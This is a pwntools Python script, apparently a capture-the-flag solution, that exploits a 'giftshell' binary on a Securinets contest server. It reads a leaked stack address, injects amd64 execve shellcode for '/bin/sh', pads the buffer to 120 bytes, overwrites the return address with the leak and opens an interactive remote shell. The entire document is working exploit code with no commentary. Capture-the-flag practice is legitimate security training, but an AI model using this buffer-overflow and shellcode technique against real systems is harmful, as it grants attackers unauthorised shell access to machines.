from pwn import *

exe = ELF('./giftshell', checksec=False)
p = remote('loveletter.securinets.tn', 4050)
input()
p.recvuntil(b'products! ')
leak = int(p.recv(14), 16)

shellcode = asm(
    '''
    mov rax, 0x3b
    mov rdi, 29400045130965551
    push rdi
    
    mov rdi, rsp
    xor rsi, rsi
    xor rdx, rdx
    
    syscall
    ''', arch='amd64'
)

payload = shellcode 
payload = payload.ljust(120)
payload += p64(leak)
p.sendafter(b'Input: \n', payload)

p.interactive()
